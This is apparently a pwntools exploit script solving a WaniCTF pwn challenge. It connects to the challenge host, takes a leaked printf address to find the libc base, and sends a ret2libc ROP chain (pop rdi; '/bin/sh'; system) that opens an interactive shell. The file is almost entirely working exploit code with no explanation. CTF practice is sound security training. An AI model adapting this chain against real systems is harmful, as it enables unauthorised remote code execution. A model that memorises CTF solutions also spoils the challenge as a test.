#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=0.0.0.0' '--port=1000' chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall_patched')
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chal-lz56g6.wanictf.org'
port = int(args.PORT or 9005)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil(b"printf = ")
leak_printf = int(io.recvline(), 16)
log.success(hex(leak_printf))
libc.address = leak_printf - libc.symbols['printf']
log.success(f'libc_base = {hex(libc.address)}')

io.sendlineafter(b": ", b'A')
for i in range(0, 2):
    io.sendlineafter(b": ", b'1')
io.sendlineafter(b": ", b'B')
for i in range(0, 2):
    io.sendlineafter(b": ", b'1')
io.sendlineafter(b": ", b'C')
for i in range(0, 2):
    io.sendlineafter(b": ", b'1')

POP_RDI_RET = p64(libc.address + 0x000000000010f75b)
RET = p64(libc.address + 0x000000000002882f)
SYSTEM = p64(libc.symbols['system'])
BIN_SH = p64(next(libc.search(b'/bin/sh')))

log.info(f'POP_RDI_RET = {hex(u64(POP_RDI_RET))}')
log.info(f'RET = {hex(u64(RET))}')
log.info(f'SYSTEM = {hex(u64(SYSTEM))}')
log.info(f'BIN_SH = {hex(u64(BIN_SH))}')

p = RET + POP_RDI_RET + BIN_SH + SYSTEM
io.sendlineafter(b": ", p)
io.sendlineafter(b": ", b'\x00') # %lf doesnt read bytes

io.interactive()

